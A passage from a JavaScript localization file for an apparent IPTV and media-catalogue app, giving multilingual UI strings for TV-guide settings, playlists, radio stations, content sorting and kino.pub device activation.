		cs: 'Interval aktualizace',
		fr: 'Intervalle de mise à jour',
		he: 'מרווח עדכון',
		ro: 'Interval de actualizare'
	},
	iptv_param_guide_interval_descr: {
		ru: 'Через сколько часов обновлять телегид',
		en: 'How many hours to update the TV guide',
		uk: 'Через скільки годин оновлювати телегід',
		be: 'Праз колькі гадзін абнаўляць тэлегід',
		zh: '多少小时更新电视指南',
		pt: 'Quantas horas para atualizar o guia de TV',
		bg: 'През колко часа да актуализира телевизионния справочник',
		cs: 'Kolik hodin aktualizovat TV průvodce',
		fr: 'Combien d\'heures pour mettre à jour le guide TV',
		he: 'כמה שעות לעדכן את מדריך הטלוויזיה',
		ro: 'Câte ore pentru a actualiza ghidul TV'
	},
	iptv_param_guide_update_after_start: {
		ru: 'Обновить при запуске приложения',
		en: 'Update on application startup',
		uk: 'Оновити при запуску додатка',
		be: 'Абнавіць пры запуску прыкладання',
		zh: '启动应用时更新',
		pt: 'Atualizar ao iniciar o aplicativo',
		bg: 'Актуализация при стартиране на приложението',
		cs: 'Aktualizace při spuštění aplikace',
		fr: 'Mise à jour au démarrage de l\'application',
		he: 'עדכון בעת ​​הפעלת האפליקציה',
		ro: 'Actualizare la pornirea aplicației'
	},
	iptv_param_guide_update_now: {
		ru: 'Обновить телегид',
		en: 'Update TV Guide Now',
		uk: 'Оновити телегід зараз',
		be: 'Абнавіць тэлегід зараз',
		zh: '立即更新电视指南',
		pt: 'Atualizar guia de TV agora',
		bg: 'Актуализирайте телевизионния справочник сега',
		cs: 'Aktualizujte TV průvodce',
		fr: 'Mettre à jour le guide TV maintenant',
		he: 'עדכן את מדריך הטלוויזיה עכשיו',
		ro: 'Actualizați Ghidul TV acum'
	},
	iptv_param_guide_save_title: {
		ru: 'Число дней хранения',
		en: 'Number of Days to Keep',
		uk: 'Кількість днів зберігання',
		be: 'Колькасць дзён захоўвання',
		zh: '保存天数',
		pt: 'Número de dias para manter',
		bg: 'Брой дни за запазване',
		cs: 'Počet dní k uchování',
		fr: 'Nombre de jours à conserver',
		he: 'מספר הימים לשמירה',
		ro: 'Numărul de zile de păstrat'
	},
	iptv_param_guide_save_descr: {
		ru: 'Сколько дней хранить телегид в кэше',
		en: 'How many days to keep the TV guide in the cache',
		uk: 'Скільки днів зберігати телегід у кеші',
		be: 'Колькі дзён захоўваць тэлегід у кэшы',
		zh: '在缓存中保存多少天的电视指南',
		pt: 'Quantos dias manter o guia de TV no cache',
		bg: 'За колко дни да се запази телевизионния справочник в кеша',
		cs: 'Kolik dní má být TV průvodce uložen v mezipaměti',
		fr: 'Combien de jours conserver le guide TV dans le cache',
		he: 'כמה ימים לשמור את מדריך הטלוויזיה במטמון',
		ro: 'Câte zile să păstrați ghidul TV în cache'
	},
	iptv_param_guide_update_custom: {
		ru: 'Вручную',
		en: 'Manual',
		uk: 'Вручну',
		be: 'Адзіначку',
		zh: '手动',
		pt: 'Manual',
		bg: 'Ръчно',
		cs: 'Manuál',
		fr: 'Manuel',
		he: 'יָדָנִי',
		ro: 'Manual'
	},
	iptv_need_update_app: {
		ru: 'Обновите приложение до последней версии',
		en: 'Update the application to the latest version',
		uk: 'Оновіть програму до останньої версії',
		be: 'Абновіце прыкладанне да апошняй версіі',
		zh: '升级应用程序到最新版本',
		pt: 'Atualize o aplicativo para a versão mais recente',
		bg: 'Актуализирайте приложението до последната версия',
		cs: 'Aktualizujte aplikaci na nejnovější verzi',
		fr: 'Mettre à jour l\'application vers la dernière version',
		he: 'עדכן את האפליקציה לגרסה העדכנית ביותר',
		ro: 'Actualizați aplicația la cea mai recentă versiune'
	},
	iptv_channel_lock: {
		ru: 'Заблокировать',
		en: 'Lock',
		uk: 'Заблокувати',
		be: 'Заблакаваць',
		zh: '锁定',
		pt: 'Bloquear',
		bg: 'Заключване',
		cs: 'Zámek',
		fr: 'Verrouillage',
		he: 'לִנְעוֹל',
		ro: 'Blocare'
	},
	iptv_channel_unlock: {
		ru: 'Разблокировать',
		en: 'Unlock',
		uk: 'Розблокувати',
		be: 'Разблакаваць',
		zh: '解锁',
		pt: 'Desbloquear',
		bg: 'Отключване',
		cs: 'Odemknout',
		fr: 'Ouvrir',
		he: 'לִפְתוֹחַ',
		ro: 'Deblocați'
	},
	iptv_about_text: {
		ru: 'Удобное приложение IPTV – откройте доступ к множеству каналов, фильмам и сериалам прямо на вашем телевизоре. Интуитивный интерфейс, легкая навигация, и безграничные возможности развлечений на вашем большом экране. Ваш личный портал в мир цифрового телевидения!',
		en: 'Convenient IPTV application - access a variety of channels, movies, and series directly on your television. Intuitive interface, easy navigation, and unlimited entertainment possibilities on your big screen. Your personal portal to the world of digital television!',
		uk: 'Зручний додаток IPTV - отримайте доступ до безлічі каналів, фільмів і серіалів прямо на вашому телевізорі. Інтуїтивний інтерфейс, легка навігація та необмежені можливості розваг на вашому великому екрані. Ваш особистий портал у світ цифрового телебачення!',
		be: 'Зручнае прыкладанне IPTV - атрымайце доступ да шматліканальнага тэлебачання, фільмаў і серыялаў проста на вашым тэлевізары. Інтуітыўны інтэрфейс, лёгкая навігацыя і неабмежаваныя магчымасці разваг на вашым вялікім экране. Ваш асабісты партал у свет цыфравага тэлебачання!',
		zh: '方便的IPTV应用程序-直接在您的电视上访问各种频道，电影和系列。直观的界面，简单的导航以及在您的大屏幕上无限的娱乐可能性。您数字电视世界的个人门户！',
		pt: 'Aplicativo IPTV conveniente - acesse uma variedade de canais, filmes e séries diretamente na sua televisão. Interface intuitiva, navegação fácil e possibilidades de entretenimento ilimitadas na sua tela grande. Seu portal pessoal para o mundo da televisão digital!',
		bg: 'Удобно приложение за IPTV - отворете достъп до множество канали, филми и сериали директно на вашия телевизор. Интуитивен интерфейс, лесна навигация и неограничени възможности за забавления на големия ви екран. Вашият личен портал към света на цифровата телевизия!',
		cs: 'Pohodlná aplikace IPTV – přístup k řadě kanálů, filmů a seriálů přímo na vaší televizi. Intuitivní rozhraní, snadná navigace a neomezené možnosti zábavy na vaší velké obrazovce. Váš osobní portál do světa digitální televize!',
		fr: 'Application IPTV pratique : accédez à une variété de chaînes, de films et de séries directement sur votre téléviseur. Interface intuitive, navigation facile et possibilités de divertissement illimitées sur votre grand écran. Votre portail personnel vers le monde de la télévision numérique !',
		he: 'אפליקציית IPTV נוחה - גש למגוון ערוצים, סרטים וסדרות ישירות בטלוויזיה שלך. ממשק אינטואיטיבי, ניווט קל ואפשרויות בידור בלתי מוגבלות על המסך הגדול שלך. הפורטל האישי שלך לעולם הטלוויזיה הדיגיטלית!',
		ro: 'Aplicație IPTV convenabilă - accesați o varietate de canale, filme și seriale direct pe televizor. Interfață intuitivă, navigare ușoară și posibilități nelimitate de divertisment pe ecranul mare. Portalul tău personal către lumea televiziunii digitale!'
	},
	iptv_confirm_delete_playlist: {
		ru: 'Вы точно хотите удалить плейлист?',
		en: 'Are you sure you want to delete the playlist?',
		uk: 'Ви точно хочете видалити плейлист?',
		be: 'Вы ўпэўненыя, што хочаце выдаліць плейліст?',
		zh: '您确定要删除播放列表吗？',
		pt: 'Tem certeza de que deseja excluir a lista de reprodução?',
		bg: 'Сигурни ли сте, че искате да изтриете списъка с канали?',
		cs: 'Opravdu chcete smazat seznam skladeb?',
		fr: 'Etes-vous sûr de vouloir supprimer la playlist ?',
		he: 'האם אתה בטוח שברצונך למחוק את רשימת ההשמעה?',
		ro: 'Sigur doriți să ștergeți lista de redare?'
	},
	iptv_cache_clear: {
		ru: 'Кеш удален',
		en: 'Cache cleared',
		uk: 'Кеш видалено',
		be: 'Кеш выдалены',
		zh: '缓存已清除',
		pt: 'Cache limpo',
		bg: 'Кешът е изчистен',
		cs: 'Cache vymazána',
		fr: 'Cache vidé',
		he: 'המטמון נוקה',
		ro: 'Cache-ul a fost golit'
	},
	iptv_playlist_deleted: {
		ru: 'Плейлист удален',
		en: 'Playlist deleted',
		uk: 'Плейлист видалено',
		be: 'Плейліст выдалены',
		zh: '播放列表已删除',
		pt: 'Lista de reprodução excluída',
		bg: 'Плейлистът е изтрит',
		cs: 'Seznam skladeb byl smazán',
		fr: 'Liste de lecture supprimée',
		he: 'הפלייליסט נמחק',
		ro: 'Lista de redare a fost ștearsă'
	},
	iptv_playlist_add_set_url: {
		ru: 'Укажите URL плейлиста',
		en: 'Enter the playlist URL',
		uk: 'Вкажіть URL плейлиста',
		be: 'Укажыце URL плейліста',
		zh: '请输入播放列表的 URL',
		pt: 'Insira o URL da lista de reprodução',
		bg: 'Въведете URL адреса на плейлиста',
		cs: 'Zadejte adresu URL seznamu skladeb',
		fr: 'Saisissez l\'URL de la playlist',
		he: 'הזן את כתובת האתר של רשימת ההשמעה',
		ro: 'Introduceți adresa URL a listei de redare'
	},
	iptv_playlist_add_new: {
		ru: 'Добавить новый плейлист',
		en: 'Add new playlist',
		uk: 'Додати новий плейлист',
		be: 'Дадаць новы плейліст',
		zh: '添加新播放列表',
		pt: 'Adicionar nova lista de reprodução',
		bg: 'Добавяне на нов списък с канали',
		cs: 'Přidat nový seznam skladeb',
		fr: 'Ajouter une nouvelle liste de lecture',
		he: 'הוסף רשימת השמעה חדשה',
		ro: 'Adăugați o listă de redare nouă'
	},
	iptv_playlist_url_changed: {
		ru: 'Ссылка изменена',
		en: 'Link changed',
		uk: 'Посилання змінено',
		be: 'Спасылка зменена',
		zh: '链接已更改',
		pt: 'Link alterado',
		bg: 'Връзката е променена',
		cs: 'Odkaz změněn',
		fr: 'Lien modifié',
		he: 'הקישור השתנה',
		ro: 'Linkul a fost schimbat'
	},
	iptv_playlist_add_set_name: {
		ru: 'Укажите название плейлиста',
		en: 'Enter the playlist name',
		uk: 'Вкажіть назву плейлиста',
		be: 'Укажыце назву плейліста',
		zh: '请输入播放列表名称',
		pt: 'Insira o nome da lista de reprodução',
		bg: 'Въведете име на плейлиста',
		cs: 'Zadejte název seznamu skladeb',
		fr: 'Entrez le nom de la playlist',
		he: 'הזן את שם רשימת ההשמעה',
		ro: 'Introduceți numele listei de redare'
	},
	iptv_playlist_name_changed: {
		ru: 'Название изменено',
		en: 'Name changed',
		uk: 'Назва змінена',
		be: 'Назва зменена',
		zh: '名称已更改',
		pt: 'Nome alterado',
		bg: 'Името е променено',
		cs: 'Jméno změněno',
		fr: 'Nom changé',
		he: 'השם שונה',
		ro: 'Numele schimbat'
	},
	iptv_playlist_use_epg: {
		ru: 'Выбрать ЕПГ плейлиста',
		en: 'Use playlist EPG',
		uk: 'Вибрати ЕПГ плейлиста',
		be: 'Выбраць ЕПГ плейліста',
		zh: '使用播放列表 EPG',
		pt: 'Usar EPG da lista',
		bg: 'Изберете ЕПГ на плейлиста',
		cs: 'Použijte seznam skladeb EPG',
		fr: 'Utiliser la liste de lecture EPG',
		he: 'השתמש ב-EPG של רשימת השמעה',
		ro: 'Folosiți lista de redare EPG'
	},
	iptv_epg_modal_title: {
		ru: 'Парсинг телегида',
		en: 'EPG parsing',
		uk: 'Парсинг телегіда',
		be: 'Парсінг тэлегіда',
		zh: '解析节目单',
		pt: 'Analisando guia',
		bg: 'Анализ на телегида',
		cs: 'Analýza EPG',
		fr: 'Analyse EPG',
		he: 'ניתוח EPG',
		ro: 'Analiza EPG'
	},
	iptv_epg_checkpoint_load: {
		ru: 'Загрузка ЕПГ',
		en: 'Loading EPG',
		uk: 'Завантаження ЕПГ',
		be: 'Загрузка ЕПГ',
		zh: '加载节目单',
		pt: 'Carregando EPG',
		bg: 'Зареждане на ЕПГ',
		cs: 'Načítání EPG',
		fr: 'Chargement de l\'EPG',
		he: 'טוען EPG',
		ro: 'Se încarcă EPG'
	},
	iptv_epg_checkpoint_parse: {
		ru: 'Разбор данных',
		en: 'Parsing data',
		uk: 'Розбір даних',
		be: 'Разбор даных',
		zh: '解析数据',
		pt: 'Analisando dados',
		bg: 'Анализ на данни',
		cs: 'Analýza dat',
		fr: 'Analyse des données',
		he: 'ניתוח נתונים',
		ro: 'Analizarea datelor'
	},
	iptv_epg_checkpoint_save: {
		ru: 'Формирование базы',
		en: 'Building database',
		uk: 'Формування бази',
		be: 'Фарміраванне базы',
		zh: '构建数据库',
		pt: 'Construindo banco',
		bg: 'Изграждане на база',
		cs: 'Budování databáze',
		fr: 'Création d\'une base de données',
		he: 'בניית מסד נתונים',
		ro: 'Construirea bazei de date'
	},
	iptv_playlist_has_epg: {
		ru: 'Плейлист содержит свой телегид',
		en: 'Playlist has built-in EPG',
		uk: 'Плейлист містить свій телегід',
		be: 'Плейліст змяшчае свой тэлегід',
		zh: '播放列表包含内置 EPG',
		pt: 'Lista possui EPG integrado',
		bg: 'Плейлистът съдържа вграден телегид',
		cs: 'Playlist má vestavěný EPG',
		fr: 'La liste de lecture a un EPG intégré',
		he: 'לפלייליסט יש EPG מובנה',
		ro: 'Lista de redare are EPG încorporat'
	},
	iptv_playlist_change_name: {
		ru: 'Изменить название',
		en: 'Change name',
		uk: 'Змінити назву',
		be: 'Змяніць назву',
		zh: '更改名称',
		pt: 'Alterar nome',
		bg: 'Промяна на името',
		cs: 'Změňte jméno',
		fr: 'Changer de nom',
		he: 'שנה שם',
		ro: 'Schimbați numele'
	},
	iptv_param_view_in_main: {
		ru: 'Показывать каналы на главной',
		en: 'Show channels on main page',
		uk: 'Показувати канали на головній',
		be: 'Паказваць каналы на галоўнай',
		zh: '在主页上显示频道',
		pt: 'Mostrar canais na página principal',
		bg: 'Показване на канали на главната страница',
		cs: 'Zobrazit kanály na hlavní stránce',
		fr: 'Afficher les chaînes sur la page principale',
		he: 'הצג ערוצים בעמוד הראשי',
		ro: 'Afișați canalele pe pagina principală'
	},
	params_iptv_modss_enable_descr: {
		ru: 'Отображает пункт "Modss-TV" в главном меню с популярными каналами',
		en: 'Displays "Modss-TV" item in the main menu with popular channels',
		uk: 'Відображає пункт "Modss-TV" в головному меню з популярними каналами',
		be: 'Адлюстроўвае пункт "Modss-TV" у галоўным меню з папулярнымі каналамі',
		zh: '在主菜单中显示“Modss-TV”项目及热门频道',
		pt: 'Exibe o item "Modss-TV" no menu principal com canais populares',
		bg: 'Показва елемент "Modss-TV" в главното меню с популярни канали',
		cs: 'Zobrazí položku "Modss-TV" v hlavní nabídce s oblíbenými kanály',
		fr: 'Affiche l\'élément "Modss-TV" dans le menu principal avec les chaînes populaires',
		he: 'מציג פריט "Modss-TV" בתפריט הראשי עם ערוצים פופולריים',
		ro: 'Afișează elementul „Modss-TV” în meniul principal cu canale populare'
	},
	iptv_later: {
		ru: 'Потом',
		uk: 'Потім',
		en: 'Later',
		be: 'Пазней',
		zh: '稍后',
		bg: 'по-късно',
		cs: 'Později',
		fr: 'Plus tard',
		he: 'מְאוּחָר יוֹתֵר',
		pt: 'Mais tarde',
		ro: 'Mai târziu'
	},
	iptv_now: {
		ru: 'Сейчас на:',
		uk: 'Зараз на:',
		en: 'Now on:',
		be: 'Зараз на:',
		zh: '正在播放：',
		bg: 'Сега на:',
		cs: 'Nyní na:',
		fr: 'Maintenant sur :',
		he: 'עכשיו ב:',
		pt: 'Agora em:',
		ro: 'Acum pe:'
	},
	modssfm_use_aac_title: {
		ru: "Предпочтение AAC",
		en: "Use AAC streams",
		uk: "Перевага AAC",
		be: "Перавага AAC",
		zh: "AAC 偏好",
		bg: 'Използване на AAC потоци',
		cs: 'Používat AAC streamy',
		fr: 'Utiliser les flux AAC',
		he: 'להשתמש בזרמי AAC',
		pt: 'Usar fluxos AAC',
		ro: 'Folosește fluxuri AAC'
	},
	modssfm_use_aac_desc: {
		ru: "Использовать AAC-потоки при доступности",
		en: "Prefer AAC streams if available",
		uk: "Віддавати перевагу потокам AAC, якщо вони доступні",
		be: "Аддавайце перавагу патокам AAC, калі яны даступныя",
		zh: "优先选择 AAC 流（如果可用）",
		bg: 'Предпочитане на AAC потоци при наличност',
		cs: 'Upřednostnit AAC streamy, pokud jsou dostupné',
		fr: 'Préférer les flux AAC s\'ils sont disponibles',
		he: 'להעדיף זרמי AAC אם זמינים',
		pt: 'Preferir fluxos AAC quando disponíveis',
		ro: 'Preferă fluxurile AAC dacă sunt disponibile'
	},
	modssfm_show_info_title: {
		ru: "Показывать информацию",
		en: "Show Info screen",
		uk: "Показати екран інформації",
		be: "Паказаць экран інфармацыі",
		zh: "显示信息屏幕",
		bg: 'Показване на информационен екран',
		cs: 'Zobrazit obrazovku informací',
		fr: 'Afficher l\'écran d\'informations',
		he: 'להציג מסך מידע',
		pt: 'Mostrar tela de informações',
		ro: 'Afișează ecranul Info'
	},
	modssfm_show_info_desc: {
		ru: "Открывать информацию о станции при выборе",
		en: "Show Playing Info screen on select",
		uk: "Показати екран інформації про відтворення на вибраному",
		be: "Паказаць экран Інфармацыя аб прайграванні пры выбары",
		zh: "选择时显示播放信息屏幕",
		bg: 'Показване на информация при избор',
		cs: 'Po výběru zobrazit obrazovku přehrávání',
		fr: 'Afficher l\'écran d\'infos de lecture à la sélection',
		he: 'להציג מסך פרטי ניגון בבחירה',
		pt: 'Mostrar informações da reprodução ao selecionar',
		ro: 'Afișează ecranul cu informații la selectare'
	},
	modssfm_show_analyzer_title: {
		ru: "Показать визуализатор",
		en: "Show visualizer",
		uk: "Показати візуалізатор",
		be: "Паказаць візуалізатар",
		zh: "显示可视化工具",
		bg: 'Показване на визуализатор',
		cs: 'Zobrazit vizualizér',
		fr: 'Afficher le visualiseur',
		he: 'להציג ויזואליזציה',
		pt: 'Mostrar visualizador',
		ro: 'Afișează vizualizatorul'
	},
	modssfm_show_analyzer_desc: {
		ru: "Анализатор аудиоспектра на заднем плане",
		en: "Audio spectrum analyzer on the background",
		uk: "Аналізатор аудіо спектру на тлі",
		be: "Аўдыё аналізатар спектру на фоне",
		zh: "背景上的音频频谱分析仪",
		bg: 'Анализатор на аудиоспектъра на заден план',
		cs: 'Analyzátor audio spektra na pozadí',
		fr: 'Analyseur de spectre audio en arrière-plan',
		he: 'מנתח ספקטרום אודיו ברקע',
		pt: 'Analisador de espectro de áudio em segundo plano',
		ro: 'Analizor de spectru audio în fundal'
	},
	modssfm_fetch_covers_title: {
		ru: "Получать обложки",
		en: "Fetch Music Covers",
		uk: "Отримати обкладинки",
		be: "Атрымаць вокладкі",
		zh: "获取音乐封面",
		bg: 'Изтегляне на музикални обложки',
		cs: 'Stáhnout obaly alb',
		fr: 'Récupérer les pochettes',
		he: 'משיכת עטיפות אלבומים',
		pt: 'Buscar capas de música',
		ro: 'Descarcă copertile muzicii'
	},
	modssfm_fetch_covers_desc: {
		ru: "Загружать обложки альбомов из Apple Music",
		en: "Search music covers on Apple Music",
		uk: "Пошук музичних обкладинок в Apple Music",
		be: "Пошук вокладак музыкі ў Apple Music",
		zh: "在 Apple Music 上搜索音乐封面",
		bg: 'Търсене на обложки в Apple Music',
		cs: 'Hledat obálky v Apple Music',
		fr: 'Rechercher les pochettes sur Apple Music',
		he: 'חיפוש עטיפות ב‑Apple Music',
		pt: 'Pesquisar capas no Apple Music',
		ro: 'Caută coperte în Apple Music'
	},
	radio_station: {
		ru: 'Радиостанция',
		en: 'Radio station',
		uk: 'Радіостанція',
		be: 'Радыёстанцыя',
		zh: '广播电台',
		bg: 'Радиостанция',
		cs: 'Rozhlasová stanice',
		fr: 'Station de radio',
		he: 'תחנת רדיו',
		pt: 'Estação de rádio',
		ro: 'Post de radio'
	},
	radio_add_station: {
		ru: 'Введите адрес радиостанции',
		en: 'Enter the address of the radio station',
		uk: 'Введіть адресу радіостанції',
		be: 'Увядзіце адрас радыёстанцыі',
		zh: '输入电台地址',
		bg: 'Въведете адреса на радиостанцията',
		cs: 'Zadejte adresu rádiové stanice',
		fr: 'Entrez l\'adresse de la station de radio',
		he: 'הזן את כתובת תחנת הרדיו',
		pt: 'Digite o endereço da estação de rádio',
		ro: 'Introduceți adresa postului de radio'
	},
	radio_load_error: {
		ru: 'Ошибка в загрузке потока',
		en: 'Error in stream loading',
		uk: 'Помилка завантаження потоку',
		be: 'Памылка ў загрузцы патоку',
		zh: '流加载错误',
		bg: 'Грешка при зареждането на потока',
		cs: 'Chyba při načítání streamu',
		fr: 'Erreur lors du chargement du flux',
		he: 'שגיאה בטעינת הזרם',
		pt: 'Erro no carregamento da transmissão',
		ro: 'Eroare la încărcarea fluxului'
	},
	pub_sort_views: {
		ru: 'По просмотрам',
		uk: 'По переглядах',
		en: 'By views',
		be: 'Па праглядах',
		zh: '按观看次数',
		bg: 'По възгледи',
		cs: 'Podle zobrazení',
		fr: 'Par vues',
		he: 'לפי השקפות',
		pt: 'Por visualizações',
		ro: 'După vederi'
	},
	pub_sort_watchers: {
		ru: 'По подпискам',
		uk: 'За підписками',
		en: 'Subscriptions',
		be: 'Па падпісках',
		zh: '订阅',
		bg: 'Абонаменти',
		cs: 'Předplatné',
		fr: 'Abonnements',
		he: 'מנויים',
		pt: 'Assinaturas',
		ro: 'Abonamente'
	},
	pub_sort_updated: {
		ru: 'По обновлению',
		uk: 'За оновленням',
		en: 'By update',
		be: 'Па абнаўленні',
		zh: '按更新',
		bg: 'Чрез актуализация',
		cs: 'Aktualizací',
		fr: 'Par mise à jour',
		he: 'לפי עדכון',
		pt: 'Por atualização',
		ro: 'Prin actualizare'
	},
	pub_sort_created: {
		ru: 'По дате добавления',
		uk: 'За датою додавання',
		en: 'By date added',
		be: 'Па даце дадання',
		zh: '按添加日期',
		bg: 'По дата на добавяне',
		cs: 'Podle data přidání',
		fr: 'Par date d\'ajout',
		he: 'לפי תאריך נוסף',
		pt: 'Por data adicionada',
		ro: 'După data adăugată'
	},
	pub_search_coll: {
		ru: 'Поиск по подборкам',
		uk: 'Пошук по добіркам',
		en: 'Search by collections',
		be: 'Пошук па падборках',
		zh: '按合集搜索',
		bg: 'Търсене по колекции',
		cs: 'Vyhledávání podle sbírek',
		fr: 'Recherche par collections',
		he: 'חפש לפי אוספים',
		pt: 'Pesquisar por coleções',
		ro: 'Căutare după colecții'
	},
	pub_title_all: {
		ru: 'Все',
		uk: 'Все',
		en: 'All',
		be: 'Усе',
		zh: '全部',
		bg: 'Всички',
		cs: 'Vše',
		fr: 'Toute',
		he: 'כֹּל',
		pt: 'Todos',
		ro: 'Toate'
	},
	pub_title_popular: {
		ru: 'Популярные',
		uk: 'Популярнi',
		en: 'Popular',
		be: 'Папулярныя',
		zh: '热门',
		bg: 'Популярни',
		cs: 'Populární',
		fr: 'Populaire',
		he: 'פּוֹפּוּלָרִי',
		pt: 'Popular',
		ro: 'Popular'
	},
	pub_title_new: {
		ru: 'Новые',
		uk: 'Новi',
		en: 'New',
		be: 'Новыя',
		zh: '新',
		bg: 'Нов',
		cs: 'Nový',
		fr: 'Nouvelle',
		he: 'חָדָשׁ',
		pt: 'Nova',
		ro: 'Nou'
	},
	pub_title_hot: {
		ru: 'Горячие',
		uk: 'Гарячi',
		en: 'Hot',
		be: 'Гарачыя',
		zh: '热门',
		bg: 'Горещо',
		cs: 'Horký',
		fr: 'Chaude',
		he: 'חַם',
		pt: 'Quente',
		ro: 'Fierbinte'
	},
	pub_title_fresh: {
		ru: 'Свежие',
		uk: 'Свiжi',
		en: 'Fresh',
		be: 'Свежыя',
		zh: '最新',
		bg: 'Свежо',
		cs: 'Čerstvý',
		fr: 'Fraîche',
		he: 'טָרִי',
		pt: 'Fresca',
		ro: 'Proaspăt'
	},
	pub_title_rating: {
		ru: 'Рейтинговые',
		uk: 'Рейтинговi',
		en: 'Rating',
		be: 'Рэйтынгавыя',
		zh: '评分',
		bg: 'Рейтинг',
		cs: 'Hodnocení',
		fr: 'Notation',
		he: 'דֵרוּג',
		pt: 'Avaliação',
		ro: 'Evaluare'
	},
	pub_title_allingenre: {
		ru: 'Всё в жанре',
		uk: 'Все у жанрі',
		en: 'All in the genre',
		be: 'Усё ў жанры',
		zh: '该类型全部',
		bg: 'Всичко в жанра',
		cs: 'Vše v žánru',
		fr: 'Tout dans le genre',
		he: 'הכל בז\'אנר',
		pt: 'Tudo no gênero',
		ro: 'Toate în gen'
	},
	pub_title_popularfilm: {
		ru: 'Популярные фильмы',
		uk: 'Популярні фільми',
		en: 'Popular movies',
		be: 'Папулярныя фільмы',
		zh: '热门电影',
		bg: 'Популярни филми',
		cs: 'Populární filmy',
		fr: 'Films populaires',
		he: 'סרטים פופולריים',
		pt: 'Filmes populares',
		ro: 'Filme populare'
	},
	pub_title_popularserial: {
		ru: 'Популярные сериалы',
		uk: 'Популярні сериали',
		en: 'Popular series',
		be: 'Папулярныя серыялы',
		zh: '热门剧集',
		bg: 'Популярни сериали',
		cs: 'Populární seriál',
		fr: 'Série populaire',
		he: 'סדרה פופולרית',
		pt: 'Séries populares',
		ro: 'Serii populare'
	},
	pub_title_newfilm: {
		ru: 'Новые фильмы',
		uk: 'Новi фiльми',
		en: 'New movies',
		be: 'Новыя фільмы',
		zh: '新电影',
		bg: 'Нови филми',
		cs: 'Nové filmy',
		fr: 'Nouveaux films',
		he: 'סרטים חדשים',
		pt: 'Novos filmes',
		ro: 'Filme noi'
	},
	pub_title_newserial: {
		ru: 'Новые сериалы',
		uk: 'Новi серiали',
		en: 'New series',
		be: 'Новыя серыялы',
		zh: '新剧集',
		bg: 'Нова серия',
		cs: 'Nová série',
		fr: 'Nouvelle série',
		he: 'סדרה חדשה',
		pt: 'Nova série',
		ro: 'Seria noua'
	},
	pub_title_newconcert: {
		ru: 'Новые концерты',
		uk: 'Новi концерти',
		en: 'New concerts',
		be: 'Новыя канцэрты',
		zh: '新音乐会',
		bg: 'Нови концерти',
		cs: 'Nové koncerty',
		fr: 'Nouveaux concerts',
		he: 'קונצרטים חדשים',
		pt: 'Novos concertos',
		ro: 'Concerte noi'
	},
	pub_title_newdocfilm: {
		ru: 'Новые док. фильмы',
		uk: 'Новi док. фiльми',
		en: 'New document movies',
		be: 'Новыя док. фільмы',
		zh: '新纪录片',
		bg: 'Нови документални филми',
		cs: 'Nové dokumentární filmy',
		fr: 'Nouveaux films documentaires',
		he: 'סרטי מסמכים חדשים',
		pt: 'Novos filmes de documentos',
		ro: 'Filme cu documente noi'
	},
	pub_title_newdocserial: {
		ru: 'Новые док. сериалы',
		uk: 'Новi док. серiали',
		en: 'New document series',
		be: 'Новыя док. серыялы',
		zh: '新纪录片剧集',
		bg: 'Нова серия документи',
		cs: 'Nová série dokumentů',
		fr: 'Nouvelle série de documents',
		he: 'סדרת מסמכים חדשה',
		pt: 'Nova série de documentos',
		ro: 'Noua serie de documente'
	},
	pub_title_newtvshow: {
		ru: 'Новое ТВ шоу',
		uk: 'Нове ТБ шоу',
		en: 'New TV show',
		be: 'Новае ТБ шоу',
		zh: '新电视节目',
		bg: 'Ново телевизионно шоу',
		cs: 'Nový televizní pořad',
		fr: 'Nouvelle émission de télévision',
		he: 'תוכנית טלוויזיה חדשה',
		pt: 'Novo programa de TV',
		ro: 'Noua emisiune TV'
	},
	pub_modal_title: {
		ru: '1. Авторизируйтесь на сайте: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. В поле "Активация устройства" введите код.',
		uk: '1. Авторизуйтесь на сайті: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2.  Введіть код у полі "Активація пристрою".',
		en: '1. Log in to the site: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2.  Enter the code in the "Device activation" field.',
		be: '1. Аўтарызуйцеся на сайце: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. Увядзіце код у полі "Активацыя прылады".',
		zh: '1. 在网站登录：<a style="color:#fff" href="#">https://kino.pub/device</a><br>2. 在「设备激活」栏输入代码。',
		bg: '1. Влезте в сайта: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. Въведете кода в полето "Активиране на устройството".',
		cs: '1. Přihlaste se na stránku: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. Zadejte kód do pole „Aktivace zařízení“.',
		fr: '1. Connectez-vous au site : <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. Saisissez le code dans le champ « Activation de l\'appareil ».',
		he: '1. היכנס לאתר: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. הזן את הקוד בשדה "הפעלת מכשיר".',
		pt: '1. Faça login no site: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. Digite o código no campo "Ativação do dispositivo".',
		ro: '1. Conectați-vă la site: <a style="color:#fff" href="#">https://kino.pub/device</a><br>2. Introduceți codul în câmpul „Activare dispozitiv”.'
	},
	pub_title_wait: {
		ru: 'Ожидание идентификации кода',
		uk: 'Очікування ідентифікації коду',
		en: 'Waiting for code identification',
		be: 'Чаканне ідэнтыфікацыі коду',
		zh: '等待代码识别',
		bg: 'Изчаква се идентификация на кода',
		cs: 'Čekání na identifikaci kódu',
		fr: 'En attente d\'identification du code',
		he: 'ממתין לזיהוי הקוד',
		pt: 'Aguardando identificação do código',
		ro: 'Se așteaptă identificarea codului'
	},
	pub_title_left_days: {
		ru: 'Осталось: ',
		uk: 'Залишилось: ',
		en: 'Left days: ',
		be: 'Засталося: ',
		zh: '剩余：',
		bg: 'Останали дни:',
		cs: 'Zbývající dny:',
		fr: 'Jours restants :',
		he: 'ימים שנותרו:',
		pt: 'Dias restantes:',
		ro: 'Zile rămase:'
	},
	pub_title_left_days_d: {
		ru: 'дн.',
		uk: 'дн.',
		en: 'd.',
		be: 'дн.',
		zh: '天',
		bg: 'd.',
		cs: 'd.',
		fr: 'd.',
		he: 'ד.',
		pt: 'd.',
		ro: 'd.'
	},
	pub_title_regdate: {
		ru: 'Дата регистрации:',
		uk: 'Дата реєстрації:',
		en: 'Date of registration:',
		be: 'Дата рэгістрацыі:',
		zh: '注册日期：',
		bg: 'Дата на регистрация:',
		cs: 'Datum registrace:',
		fr: 'Date d\'inscription :',
		he: 'תאריך ההרשמה:',
		pt: 'Data de registro:',
		ro: 'Data inregistrarii:'
	},
	pub_date_end_pro: {
		ru: 'ПРО заканчивается:',
